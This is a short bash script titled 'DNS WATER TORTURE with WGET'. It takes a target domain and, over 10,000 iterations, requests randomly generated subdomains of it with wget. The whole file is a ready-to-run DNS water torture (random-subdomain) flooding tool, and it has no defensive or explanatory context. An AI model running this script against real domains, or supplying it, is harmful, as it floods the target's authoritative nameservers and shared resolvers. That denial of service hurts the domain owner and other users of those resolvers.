#!/bin/bash
# Christopher Gray
# Update: 2/22/20
# Version: 0.8.1
#---------------------------------------
# DNS WATER TORTURE with WGET

if [ -z "$1" ]
   then
      echo "Domain Name Required. please define one before continuing \r\n"
      exit
else
      DomainName=$1
      echo "Domain Name is set to $DomainName \r\n"
fi

for (( c=1; c<=10000; c++ ))
do
   #wget -O /dev/null $RANDOM.$DomainName
   NEW_UUID_MORE_CHARACTERS=$(cat /dev/urandom | tr -dc "a-zA-Z0-9!@#$%^&*()_+?><~\`;'" | fold -w 32 | head -n 1)
   echo $NEW_UUID_MORE_CHARACTERS.$DomainName
   wget -O /dev/null $NEW_UUID_MORE_CHARACTERS.$DomainName
done
